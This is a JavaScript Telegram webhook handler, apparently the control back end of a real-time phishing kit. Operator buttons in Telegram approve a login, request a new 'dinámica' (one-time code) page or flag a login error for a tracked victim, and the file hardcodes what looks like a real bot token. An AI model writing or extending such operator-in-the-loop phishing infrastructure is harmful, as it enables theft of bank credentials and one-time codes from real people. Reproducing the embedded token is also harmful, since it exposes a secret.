// api/webhook.js - Recibe callbacks de Telegram
export default async function handler(req, res) {
    // Habilitar CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { callback_query } = req.body;

        if (callback_query) {
            const data = callback_query.data;
            const messageId = callback_query.message.message_id;
            const chatId = callback_query.message.chat.id;

            // Extraer acción y userId
            const [action, userId] = data.split('_');

            // Guardar estado en memoria (temporal)
            if (!global.userStates) {
                global.userStates = {};
            }

            // Definir acción
            let status = '';
            let nextPage = '';

            switch (action) {
                case 'approve':
                    status = 'approved';
                    nextPage = 'finish.html';
                    break;
                case 'retry':
                    status = 'retry';
                    nextPage = 'dinamica.html';
                    break;
                case 'error':
                    status = 'error';
                    nextPage = 'neq.html';
                    break;
            }

            // Guardar estado
            global.userStates[userId] = {
                status,
                nextPage,
                timestamp: Date.now()
            };

            // Responder a Telegram
            const TELEGRAM_BOT_TOKEN = '7591157193:AAHFVlUcvlY2ep6nvCoiXg8G86nxGs4yvyc';

            // Actualizar mensaje en Telegram
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    message_id: messageId,
                    text: callback_query.message.text + `\n\n✅ Acción: ${action.toUpperCase()}`,
                    parse_mode: 'HTML'
                })
            });

            // Responder al callback
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    callback_query_id: callback_query.id,
                    text: `✅ ${action === 'approve' ? 'Aprobado' : action === 'retry' ? 'Nueva dinámica solicitada' : 'Error de login'}`
                })
            });

            return res.status(200).json({ ok: true });
        }

        return res.status(200).json({ ok: true });
    } catch (error) {
        console.error('Error:', error);
        return res.status(500).json({ error: error.message });
    }
}
